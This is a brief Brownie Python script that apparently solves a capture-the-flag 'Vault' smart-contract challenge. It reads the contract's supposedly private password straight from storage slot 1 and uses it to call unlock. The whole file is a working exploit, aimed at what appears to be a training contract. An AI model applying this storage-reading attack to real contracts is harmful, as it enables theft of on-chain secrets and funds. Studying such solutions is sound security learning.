from brownie import Vault, config,accounts,web3

#input the contract address
#> contract.address
contractAddress = '0xC49c16c7d76aec04bAbDF8A6B6475c09985E7140'
player = accounts.add(config["wallets"]["from_key"])

def solution():
    vault = Vault.at(contractAddress)
    hexPassword = web3.eth.getStorageAt(vault.address,1)
    #password = web3.toText(hexPassword)
    vault.unlock(hexPassword,{"from":player})
    
def main():
    solution()